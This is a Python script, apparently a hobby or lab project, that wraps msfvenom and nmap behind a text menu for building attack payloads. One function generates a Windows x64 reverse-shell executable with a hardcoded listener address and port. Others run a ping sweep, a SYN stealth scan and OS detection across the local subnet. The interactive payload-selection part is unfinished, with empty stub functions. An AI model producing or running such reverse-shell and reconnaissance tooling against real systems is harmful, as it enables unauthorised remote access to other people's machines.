#!/usr/bin/env python3                # specify the interpreter

# Varibles/Imports
import os
from colorama import Fore, Back, Style
import subprocess # import the subprocess library
import socket # import the socket library

### HELPER FUNCTIONS ###
def get_local():  # calls ifconfig
    if_output = subprocess.run(['ifconfig']) # uses the subprocess function to run the ifconfig command
    return if_output

def list_payloads(): # lists all the msfvenom payloads
    msf_payloads = subprocess.run(['msfvenom','-l','payloads']) # uses the subprocess function to run the msfvenom function and get a list of the msfvenom payloads
    return msf_payloads

def windows_reverse_payload(): # creates a payload for a windows machine with all the options hard coded
    payload = subprocess.run(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe']) # payload creation with hardcoded options
    return payload

def get_ip(): # gets ip address of local computer
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip_address = s.getsockname()[0]
    return ip_address

def get_subnet(): # gets the first three octets of the local hosts ipv4 address and adds 1-255
    local_address = get_ip()
    ipremoved =''.join(local_address.rpartition('.')[:2])
    subnet = ipremoved + "1-255"
    return subnet

def ping_sweep(): # does a sweep of the local network using nmap
    subnet = get_subnet()
    sweep = subprocess.run(['nmap','-sP',subnet])
    return sweep
    
def ping_scan(): # does a stealth scan for machines with open ports in the local network using nmap
    subnet = get_subnet()
    stealth_scan = subprocess.run(['sudo','nmap','-sS',subnet])
    return stealth_scan

def os_scan(): # tries to find the os of machines on the local network
    subnet = get_subnet()
    operating_systems = subprocess.run(['sudo','nmap','-O',subnet])
    return operating_systems
    
#Main Script
#Varibles
pastPackets = ()
baseSearch = ("msfvenom -l payloads |")


#allowable commands
os.system('cls' if os.name == 'nt' else "printf '\033c'")
menuOutput = "c", "C", "p", "P"

#Asking the user the target's operating system
print(Fore.RED + "MSFVenom Wrapper:")
#Main Menu
print("Welcome to our MSFVenom wrapper that will help you through creating a packet with step by step questions guided.")
print()
print("   Options:  ")
print()
print("   C - Create New Packet")
print("   P - Past Packet ")
print()

userInput = input(Fore.WHITE + "Command Line: ")

#Testing if the operation system is a valid system if not loop until right
while userInput not in menuOutput:
  os.system('cls' if os.name == 'nt' else "printf '\033c'")
  print(Fore.RED + str(userInput) + " is not a valid option.")
  print("   Options:  ")
  print()
  print("   C - Create New Packet")
  print("   P - Past Packet ")
  print()
  userInput = input(Fore.WHITE + "Command Line: ")

#Payload Creator
def createPayload():
  global packetFinal
  packetCreation = 1
  global packetSearch
  os.system('cls' if os.name == 'nt' else "printf '\033c'")
  print(Fore.RED + "Payload Creation:")
  print("Welcome, to allow for easier creation of your payload we will run you through some questions limiting to what is best suited for your needs then allowing you to pick from a more directed list of packets.")
  print()
  print("   (   If unkown press enter to skip question   )")
  print()

  #OS Question 1
  print("   Question 1: What is the targeted operating system? ")
  print("   Options: linux, mac, windows")
  print()
  OS = input(Fore.WHITE + "Command Line: ")

  #If not command for OS
  operatingSystem = "linux", "windows", "mac"
  while OS not in operatingSystem:
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   print(Fore.RED + str(OS) + " is not a valid operating system, what is your target's Operating System?")
   print("Options: Linux, Mac, Windows")
   print()
   OS = input(Fore.WHITE + "Command Line: ")
  
  #Adds OS to search
  packetSearch = (str(baseSearch) + " grep " + str(OS) + " |")
  packetFinal = ""

  while packetCreation == 1:
    os.system('cls' if os.name == 'nt' else "printf '\033c'")

    #Grep Question 2/...
    print(Fore.RED + "   Question 2: Are there any certain keys you wish to grep for? ")
    print("   Examples: reverse, x86, windows")
    print("   Note: If nothing else just press enter")
    print()
    OS = input(Fore.WHITE + "Command Line: ")
    if OS == "":
      packetFinal = (str(packetSearch) + " grep -iv meterpreter | grep -v staged")
      packetCreation = 0

    else:
      packetSearch += (str(packetFinal) + " grep " + str(OS) + " |")

def  Lportnhost():
  #Find LPort and LHost
  print()

def finlization():
  #Type of payload and naming payload
  print()

 

#Main Execution Program
if userInput == "C" or userInput == "c":
    createPayload()

print()
print("Final Output")
print(str(packetFinal))

